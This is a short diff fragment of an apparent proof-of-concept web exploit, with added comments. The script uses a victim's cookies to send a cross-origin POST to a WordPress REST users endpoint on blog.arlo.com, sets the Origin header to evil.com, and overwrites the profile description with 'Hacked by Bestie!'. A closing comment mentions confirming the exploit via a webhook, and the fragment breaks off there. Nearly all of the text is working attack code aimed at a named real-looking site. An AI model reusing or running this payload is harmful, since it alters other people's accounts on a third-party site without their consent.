@@ -8,14 +8,14 @@
 <script>
 // Change victim's profile data using THEIR cookies
 fetch('https://blog.arlo.com/wp-json/wp/v2/users/me', {
-  method: 'POST',
+  method: 'POST',  // Change from GET to POST to allow the body
   credentials: 'include',
   headers: {
     'Content-Type': 'application/json',
     'Origin': 'https://evil.com'
   },
   body: JSON.stringify({
-    description: 'Hacked by Bestie!'
+    description: 'Hacked by Bestie!'  // The data you're sending
   })
 }).then(r => {
   // Confirm exploit via webhook
